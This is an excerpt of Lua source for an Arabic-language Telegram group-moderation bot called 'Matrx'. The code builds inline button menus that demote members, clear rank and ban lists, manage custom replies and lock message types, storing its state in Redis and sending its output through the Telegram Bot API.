keyboard.inline_keyboard = {{{text="• تنزيل مميز •",callback_data=data.sender_user_id_..":RemMem:"..Rio},{text="• تنزيل ادمن •",callback_data=data.sender_user_id_..":RemAdmin:"..Rio}},{{text="• تنزيل منشئ •",callback_data=data.sender_user_id_..":RemConstructor:"..Rio},{text="• تنزيل مدير •",callback_data=data.sender_user_id_..":RemManager:"..Rio}},{{text="• تنزيل منظف •",callback_data=data.sender_user_id_..":RemCleaner:"..Rio},{text="• تنزيل منشئ  اساسي •",callback_data=data.sender_user_id_..":RemBasicConstructor:"..Rio}},{{text="• تنزيل مالك •",callback_data=data.sender_user_id_..":RemOwner:"..Rio},{text="• تنزيل مطور •",callback_data=data.sender_user_id_..":RemSudoBot:"..Rio}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
elseif SudoBot(data) then
keyboard.inline_keyboard = {{{text="• تنزيل مميز •",callback_data=data.sender_user_id_..":RemMem:"..Rio},{text="• تنزيل ادمن •",callback_data=data.sender_user_id_..":RemAdmin:"..Rio}},{{text="• تنزيل منشئ •",callback_data=data.sender_user_id_..":RemConstructor:"..Rio},{text="• تنزيل مدير •",callback_data=data.sender_user_id_..":RemManager:"..Rio}},{{text="• تنزيل منظف •",callback_data=data.sender_user_id_..":RemCleaner:"..Rio},{text="• تنزيل منشئ  اساسي •",callback_data=data.sender_user_id_..":RemBasicConstructor:"..Rio}},{{text="• تنزيل مالك •",callback_data=data.sender_user_id_..":RemOwner:"..Rio}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
elseif Owner(data) then
keyboard.inline_keyboard = {{{text="• تنزيل مميز •",callback_data=data.sender_user_id_..":RemMem:"..Rio},{text="• تنزيل ادمن •",callback_data=data.sender_user_id_..":RemAdmin:"..Rio}},{{text="• تنزيل منشئ •",callback_data=data.sender_user_id_..":RemConstructor:"..Rio},{text="• تنزيل مدير •",callback_data=data.sender_user_id_..":RemManager:"..Rio}},{{text="• تنزيل منظف •",callback_data=data.sender_user_id_..":RemCleaner:"..Rio},{text="• تنزيل منشئ  اساسي •",callback_data=data.sender_user_id_..":RemBasicConstructor:"..Rio}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
elseif BasicConstructor(data) then
keyboard.inline_keyboard = {{{text="• تنزيل مميز •",callback_data=data.sender_user_id_..":RemMem:"..Rio},{text="• تنزيل ادمن •",callback_data=data.sender_user_id_..":RemAdmin:"..Rio}},{{text="• تنزيل منشئ •",callback_data=data.sender_user_id_..":RemConstructor:"..Rio},{text="• تنزيل مدير •",callback_data=data.sender_user_id_..":RemManager:"..Rio}},{{text="• تنزيل منظف •",callback_data=data.sender_user_id_..":RemCleaner:"..Rio}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
elseif Constructor(data) then
keyboard.inline_keyboard = {{{text="• تنزيل مميز •",callback_data=data.sender_user_id_..":RemMem:"..Rio},{text="• تنزيل ادمن •",callback_data=data.sender_user_id_..":RemAdmin:"..Rio}},{{text="• تنزيل منظف •",callback_data=data.sender_user_id_..":RemCleaner:"..Rio},{text="• تنزيل مدير •",callback_data=data.sender_user_id_..":RemManager:"..Rio}},{{text = '• Matrx TeAM •',url="t.me/FZOFZ"}}}
elseif Manager(data) then
keyboard.inline_keyboard = {{{text="• تنزيل مميز •",callback_data=data.sender_user_id_..":RemMem:"..Rio},{text="• تنزيل ادمن •",callback_data=data.sender_user_id_..":RemAdmin:"..Rio}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
elseif Admin(data) then
keyboard.inline_keyboard = {{{text="• تنزيل مميز •",callback_data=data.sender_user_id_..":RemMem:"..Rio}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
end
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
end
...
local Del = DevRio:get(Matrx..'Rio:Del')
local Text = [[
᥀︙اهلا بك في قائمة اوامر الرتب ↫ ⤈ 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
*᥀︙يمكنك مسح رتب المجموعه من خلال الازرار اسفل*
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙[Source Channel](https://t.me/FZOFZ)
]] 
keyboard = {} 
if Sudo(data) then
keyboard.inline_keyboard = {{{text="• مسح الاساسيين •",callback_data="/DelRioSudo:"..data.sender_user_id_},{text="• مسح الثانويين •",callback_data="/DelSecondSudo:"..data.sender_user_id_}},{{text="• مسح المطورين •",callback_data="/DelSudoBot:"..data.sender_user_id_},{text="• مسح المالكين •",callback_data="/DelOwner:"..data.sender_user_id_}},{{text="• مسح المنشئين الاساسيين •",callback_data="/DelBasicConstructor:"..data.sender_user_id_},{text="• مسح المنشئين •",callback_data="/DelConstructor:"..data.sender_user_id_}},{{text="• مسح المدراء •",callback_data="/DelManagers:"..data.sender_user_id_},{text="• مسح الادمنيه •",callback_data="/DelAdmins:"..data.sender_user_id_}},{{text="• مسح المميزين •",callback_data="/DelVipMem:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• القائمه الرئيسيه •",callback_data="/DelList:"..data.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
elseif RioSudo(data) then
...
elseif BasicConstructor(data) then
keyboard.inline_keyboard = {{{text="• مسح المنشئين •",callback_data="/DelConstructor:"..data.sender_user_id_}},{{text="• مسح المدراء •",callback_data="/DelManagers:"..data.sender_user_id_},{text="• مسح الادمنيه •",callback_data="/DelAdmins:"..data.sender_user_id_}},{{text="• مسح المميزين •",callback_data="/DelVipMem:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• القائمه الرئيسيه •",callback_data="/DelList:"..data.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
elseif Constructor(data) then
keyboard.inline_keyboard = {{{text="• مسح المدراء •",callback_data="/DelManagers:"..data.sender_user_id_},{text="• مسح الادمنيه •",callback_data="/DelAdmins:"..data.sender_user_id_}},{{text="• مسح المميزين •",callback_data="/DelVipMem:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• القائمه الرئيسيه •",callback_data="/DelList:"..data.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
elseif Manager(data) then
keyboard.inline_keyboard = {{{text="• مسح الادمنيه •",callback_data="/DelAdmins:"..data.sender_user_id_}},{{text="• مسح المميزين •",callback_data="/DelVipMem:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• القائمه الرئيسيه •",callback_data="/DelList:"..data.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
elseif Admin(data) then
keyboard.inline_keyboard = {{{text="• مسح المميزين •",callback_data="/DelVipMem:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• القائمه الرئيسيه •",callback_data="/DelList:"..data.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
end
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
...
DevRio:del(Matrx..'Rio:SecondSudo:')
...
DevRio:del(Matrx..'Rio:Owner:'..data.chat_id_)
...
DevRio:del(Matrx..'Rio:UsersMsgs'..data.chat_id_..':'..data.sender_user_id_)
...
DevRio:del(Matrx..'Rio:Constructor:'..data.chat_id_)
Text = "*᥀︙تم حذف المنشئين*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• القائمه الرئيسيه •",callback_data="/DelList:"..data.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
...
DevRio:del(Matrx..'Rio:Managers:'..data.chat_id_)
Text = "*᥀︙تم حذف المدراء*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• القائمه الرئيسيه •",callback_data="/DelList:"..data.sender_user_id_}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevRio:del(Matrx..'Rio:Admins:'..data.chat_id_)
...
DevRio:del(Matrx..'Rio:VipMem:'..data.chat_id_)
...
DevRio:del(Matrx..'Rio:Cleaner:'..data.chat_id_)
...
DevRio:del(Matrx..'Rio:Muted:'..data.chat_id_)
...
local List = DevRio:smembers(Matrx..'Rio:Tkeed:'..data.chat_id_)
for k,v in pairs(List) do   
...
DevRio:srem(Matrx..'Rio:Tkeed:'..data.chat_id_, v)
end
...
DevRio:del(Matrx..'Rio:Ban:'..data.chat_id_)
...
DevRio:del(Matrx..'Rio:BanAll:')
DevRio:del(Matrx..'Rio:MuteAll:')
...
--     Source Matrx     --
if DataText and DataText:match('/DelGpRed:'..tonumber(data.sender_user_id_)..'(.*)') and not DevRio:get(Matrx..'Rio:Lock:GpRd'..data.chat_id_) then
local Rio = DataText:match('/DelGpRed:'..tonumber(data.sender_user_id_)..'(.*)')
local redod = DevRio:smembers(Matrx..'Rio:Manager:GpRed'..data.chat_id_)
if #redod == 0 then
Text = "*᥀︙لا توجد ردود مضافه*"
else
for k,v in pairs(redod) do
DevRio:del(Matrx..'Rio:Gif:GpRed'..v..data.chat_id_)
DevRio:del(Matrx..'Rio:Voice:GpRed'..v..data.chat_id_)
DevRio:del(Matrx..'Rio:Audio:GpRed'..v..data.chat_id_)
DevRio:del(Matrx..'Rio:Photo:GpRed'..v..data.chat_id_)
DevRio:del(Matrx..'Rio:Stecker:GpRed'..v..data.chat_id_)
DevRio:del(Matrx..'Rio:Video:GpRed'..v..data.chat_id_)
DevRio:del(Matrx..'Rio:File:GpRed'..v..data.chat_id_)
DevRio:del(Matrx..'Rio:Text:GpRed'..v..data.chat_id_)
DevRio:del(Matrx..'Rio:Manager:GpRed'..data.chat_id_)
end
...
if DataText and DataText:match('/DelGpRedAll:'..tonumber(data.sender_user_id_)..'(.*)') and not DevRio:get(Matrx..'Rio:Lock:GpRd'..data.chat_id_) then
local Rio = DataText:match('/DelGpRedAll:'..tonumber(data.sender_user_id_)..'(.*)')
local redod = DevRio:smembers(Matrx.."Rio:Sudo:AllRed")
if #redod == 0 then
Text = "*᥀︙لا توجد ردود مضافه*"
else
for k,v in pairs(redod) do
DevRio:del(Matrx.."Rio:Add:AllRed"..v)
DevRio:del(Matrx.."Rio:Gif:AllRed"..v)
DevRio:del(Matrx.."Rio:Voice:AllRed"..v)
DevRio:del(Matrx.."Rio:Audio:AllRed"..v)
DevRio:del(Matrx.."Rio:Photo:AllRed"..v)
DevRio:del(Matrx.."Rio:Stecker:AllRed"..v)
DevRio:del(Matrx.."Rio:Video:AllRed"..v)
DevRio:del(Matrx.."Rio:File:AllRed"..v)
DevRio:del(Matrx.."Rio:Text:AllRed"..v)
DevRio:del(Matrx.."Rio:Sudo:AllRed")
end
...
if not Bot(data) and DevRio:get(Matrx..'Rio:Lock:Rd'..data.chat_id_) then 
...
DevRio:set(Matrx..'Rio:Add:GpRed'..data.sender_user_id_..data.chat_id_,'SetGpRed')
EditMsg(Chat_Id2, Msg_Id2, "᥀︙حسنا ارسل الكلمه الان") 
return false
end end
if text and text:match("^(.*)$") then
local SetGpRed = DevRio:get(Matrx..'Rio:Add:GpRed'..data.sender_user_id_..data.chat_id_)
if SetGpRed == 'SetGpRed' then
if text == "الغاء" then 
Dev_Rio(data.chat_id_, data.id_, 1, "᥀︙تم الغاء الامر" ,  1, "md")
DevRio:del(Matrx..'Rio:Add:GpRed'..data.sender_user_id_..data.chat_id_)
return false
end
Text = "᥀︙ارسل لي الرد سواء كان ↫ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙يمكنك اضافة الى النص ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n `#username` ↬ معرف المستخدم\n `#msgs` ↬ عدد الرسائل\n `#name` ↬ اسم المستخدم\n `#id` ↬ ايدي المستخدم\n `#stast` ↬ رتبة المستخدم\n `#edit` ↬ عدد السحكات\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙للخروج ارسل ↫ ( الغاء )\n ✓"
DevRio:set(Matrx..'Rio:Add:GpRed'..data.sender_user_id_..data.chat_id_,'SaveGpRed')
DevRio:set(Matrx..'Rio:Add:GpText'..data.sender_user_id_..data.chat_id_,text)
DevRio:sadd(Matrx..'Rio:Manager:GpRed'..data.chat_id_,text)
DevRio:set(Matrx..'DelManagerRep'..data.chat_id_,text)
keyboard = {} 
keyboard.inline_keyboard = {{{text="• تغير الرد •",callback_data="/ChangeRed:"..data.sender_user_id_}},{{text="• الغاء •",callback_data="/CancelRed:"..data.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text or redod).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end end
--     Source Matrx     --
...
DevRio:set(Matrx.."Rio:Add:AllRed"..data.sender_user_id_,'SetAllRed')
EditMsg(Chat_Id2, Msg_Id2, "᥀︙حسنا ارسل الكلمه الان") 
return false
end end
if text and text:match("^(.*)$") then
local SetAllRed = DevRio:get(Matrx.."Rio:Add:AllRed"..data.sender_user_id_)
if SetAllRed == 'SetAllRed' then
if text == "الغاء" then 
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم الغاء الامر") 
DevRio:del(Matrx..'Rio:Add:AllRed'..data.sender_user_id_)
return false
end
Text = "᥀︙ارسل لي الرد سواء كان ↫ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙يمكنك اضافة الى النص ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n `#username` ↬ معرف المستخدم\n `#datas` ↬ عدد الرسائل\n `#name` ↬ اسم المستخدم\n `#id` ↬ ايدي المستخدم\n `#stast` ↬ رتبة المستخدم\n `#edit` ↬ عدد السحكات\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙للخروج ارسل ↫ ( الغاء )\n ✓"
DevRio:set(Matrx.."Rio:Add:AllRed"..data.sender_user_id_,'SaveAllRed')
DevRio:set(Matrx.."Rio:Add:AllText"..data.sender_user_id_, text)
DevRio:sadd(Matrx.."Rio:Sudo:AllRed",text)
DevRio:set(Matrx.."DelSudoRep",text)
keyboard = {} 
keyboard.inline_keyboard = {{{text="• تغير الرد •",callback_data="/ChangeAllRed:"..data.sender_user_id_}},{{text="• الغاء •",callback_data="/CancelAllRed:"..data.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text or redod).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end end
--     Source Matrx     --
...
local List = DevRio:smembers(Matrx.."List:Cmd:Group:New"..data.chat_id_)
for k,v in pairs(List) do
DevRio:del(Matrx.."Set:Cmd:Group:New1"..data.chat_id_..":"..v)
DevRio:del(Matrx.."List:Cmd:Group:New"..data.chat_id_)
end
Text = "᥀︙تم حذف الاوامر المضافه في المجموعه"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/CmdList:"..data.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text or redod).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
DevRio:set(Matrx.."Set:Cmd:Group:New1"..data.chat_id_..":ا","ايدي")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..data.chat_id_,"ا")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..data.chat_id_..":م","رفع مميز")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..data.chat_id_,"م")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..data.chat_id_..":اد","رفع ادمن")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..data.chat_id_,"اد")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..data.chat_id_..":مد","رفع مدير")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..data.chat_id_,"مد")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..data.chat_id_..":من","رفع منشئ")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..data.chat_id_,"من")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..data.chat_id_..":اس","رفع منشئ اساسي")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..data.chat_id_,"اس")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..data.chat_id_..":مط","رفع مطور")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..data.chat_id_,"مط")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..data.chat_id_..":ثانوي","رفع مطور ثانوي")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..data.chat_id_,"ثانوي")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..data.chat_id_..":تك","تنزيل الكل")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..data.chat_id_,"تك")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..data.chat_id_..":تعط","تعطيل الايدي بالصوره")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..data.chat_id_,"تعط")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..data.chat_id_..":تفع","تفعيل الايدي بالصوره")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..data.chat_id_,"تفع")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..data.chat_id_..":ر","الرابط")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..data.chat_id_,"ر")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..data.chat_id_..":رر","ردود المدير")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..data.chat_id_,"رر")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..data.chat_id_..":،،","مسح المكتومين")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..data.chat_id_,"،،")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..data.chat_id_..":رد","اضف رد")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..data.chat_id_,"رد")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..data.chat_id_..":غ","غنيلي")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..data.chat_id_,"غ")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..data.chat_id_..":#","مسح قائمه العام")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..data.chat_id_,"#")
...
local DelSudoRep = DevRio:get(Matrx..'DelSudoRep')
DevRio:del(Matrx.."Rio:Sudo:AllRed",DelSudoRep)
DevRio:del(Matrx.."Rio:Add:AllText"..data.sender_user_id_)
DevRio:del(Matrx.."Rio:Add:AllRed"..data.sender_user_id_)
DevRio:del(Matrx.."DelSudoRep")
Text = "᥀︙تم الغاء حفظ الرد"
keyboard = {} 
keyboard.inline_keyboard = {{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
...
local DelManagerRep = DevRio:get(Matrx..'DelManagerRep'..data.chat_id_)
DevRio:srem(Matrx..'Rio:Manager:GpRed'..data.chat_id_,DelManagerRep)
DevRio:del(Matrx..'Rio:Add:GpText'..data.sender_user_id_..data.chat_id_)
DevRio:del(Matrx..'Rio:Add:GpRed'..data.sender_user_id_..data.chat_id_)
DevRio:del(Matrx..'DelManagerRep'..data.chat_id_)
Text = "᥀︙تم الغاء حفظ الرد"
keyboard = {} 
keyboard.inline_keyboard = {{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local Cmd = DevRio:get(Matrx..'Rio:Cmd')
local Text = [[
*᥀︙من خلال الازرار يمكنك التحكم بأوامر المجموعه*
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="• ترتيب الاوامر •",callback_data="/SetCmd:"..data.sender_user_id_},{text="• مسح الاوامر المضافه •",callback_data="/DelCmd:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
...
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local Msg = DevRio:get(Matrx..'Rio:Msg')
local Text = [[
*᥀︙من خلال الازرار يمكنك مسح رسائلك وسحكاتك*
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="• مسح رسائلي •",callback_data="/DelMsg:"..data.sender_user_id_},{text="• مسح سحكاتي •",callback_data="/DelEdit:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
...
DevRio:del(Matrx..'Rio:EditMsg'..data.chat_id_..':'..data.sender_user_id_)
Text = "*᥀︙تم حذف جميع تعديلاتك بنجاح*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• رجوع •",callback_data="/DelHome:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
--     Source Matrx     --
...
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local Filter = DevRio:get(Matrx..'Rio:Filter')
local Text = [[
...
DevRio:del(Matrx.."Rio:FilterAnimation"..data.chat_id_)
Text = "*᥀︙تم حذف جميع المتحركات الممنوعه بنجاح*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• رجوع •",callback_data="/FilterList:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
DevRio:del(Matrx.."Rio:FilterSteckr"..data.chat_id_)
...
DevRio:del(Matrx.."Rio:FilterPhoto"..data.chat_id_)
...
DevRio:del(Matrx..'Rio:Filters:'..data.chat_id_)
...
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local locklist = DevRio:get(Matrx..'Rio:locklist')
local Text = [[
...
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local LockBotList = DevRio:get(Matrx..'Rio:LockBotList')
local Text = [[
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="• قفل البوتات بالطرد •",callback_data="/lockBotKick:"..data.sender_user_id_},{text="• قفل البوتات بالتقيد •",callback_data="/lockBotKed:"..data.sender_user_id_}},{{text="• قفل البوتات بالكتم •",callback_data="/lockBotDel:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/locklist:"..data.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
--     Source Matrx     --
...
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local LockSpamList = DevRio:get(Matrx..'Rio:LockSpamList')
local Text = [[
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="• قفل التكرار بالطرد •",callback_data="/lockSpamKick:"..data.sender_user_id_},{text="• قفل التكرار بالتقيد •",callback_data="/lockSpamKed:"..data.sender_user_id_}},{{text="• قفل التكرار بالحذف •",callback_data="/lockSpamDel:"..data.sender_user_id_},{text="• قفل التكرار بالكتم •",callback_data="/lockSpamMute:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/locklist:"..data.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
--     Source Matrx     --
if DataText == '/lockjoin:'..data.sender_user_id_ then
if not DevRio:get(Matrx..'Rio:Lock:Join'..data.chat_id_) then
DevRio:set(Matrx..'Rio:Lock:Join'..data.chat_id_,true)
Text = "*᥀︙تم قفل الدخول بنجاح*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/locklist:"..data.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
end
if DataText == '/unlockjoin:'..data.sender_user_id_ then
if DevRio:get(Matrx..'Rio:Lock:Join'..data.chat_id_) then
DevRio:del(Matrx..'Rio:Lock:Join'..data.chat_id_)
...
if not DevRio:get(Matrx..'Rio:Lock:Text'..data.chat_id_) then
DevRio:set(Matrx..'Rio:Lock:Text'..data.chat_id_,true)
...
if DevRio:get(Matrx..'Rio:Lock:Text'..data.chat_id_) then
DevRio:del(Matrx..'Rio:Lock:Text'..data.chat_id_)
...
if not DevRio:get(Matrx..'Rio:Lock:TagServr'..data.chat_id_) then
DevRio:set(Matrx..'Rio:Lock:TagServr'..data.chat_id_,true)
...
if DevRio:get(Matrx..'Rio:Lock:TagServr'..data.chat_id_) then
DevRio:del(Matrx..'Rio:Lock:TagServr'..data.chat_id_) 
...
if not DevRio:get(Matrx..'Rio:Lock:EditMsgs'..data.chat_id_) then
DevRio:set(Matrx..'Rio:Lock:EditMsgs'..data.chat_id_,true)
...
if DevRio:get(Matrx..'Rio:Lock:EditMsgs'..data.chat_id_) then
DevRio:del(Matrx..'Rio:Lock:EditMsgs'..data.chat_id_)
...
if not DevRio:get(Matrx..'Rio:Lock:Stickers'..data.chat_id_) then
DevRio:set(Matrx..'Rio:Lock:Stickers'..data.chat_id_,true)
...
if DevRio:get(Matrx..'Rio:Lock:Stickers'..data.chat_id_) then
DevRio:del(Matrx..'Rio:Lock:Stickers'..data.chat_id_)
...
if not DevRio:get(Matrx..'Rio:Lock:Gifs'..data.chat_id_) then
DevRio:set(Matrx..'Rio:Lock:Gifs'..data.chat_id_,true)
...
if DevRio:get(Matrx..'Rio:Lock:Gifs'..data.chat_id_) then
DevRio:del(Matrx..'Rio:Lock:Gifs'..data.chat_id_)
...
if not DevRio:get(Matrx..'Rio:Lock:Photo'..data.chat_id_) then
DevRio:set(Matrx..'Rio:Lock:Photo'..data.chat_id_,true) 
...
if DevRio:get(Matrx..'Rio:Lock:Photo'..data.chat_id_) then
DevRio:del(Matrx..'Rio:Lock:Photo'..data.chat_id_)
...
if not DevRio:get(Matrx..'Rio:Lock:Videos'..data.chat_id_) then
DevRio:set(Matrx..'Rio:Lock:Videos'..data.chat_id_,true)
...
if DevRio:get(Matrx..'Rio:Lock:Videos'..data.chat_id_) then
DevRio:del(Matrx..'Rio:Lock:Videos'..data.chat_id_)
...
if not DevRio:get(Matrx..'Rio:Lock:Forwards'..data.chat_id_) then
DevRio:set(Matrx..'Rio:Lock:Forwards'..data.chat_id_,true)
...
if DevRio:get(Matrx..'Rio:Lock:Forwards'..data.chat_id_) then
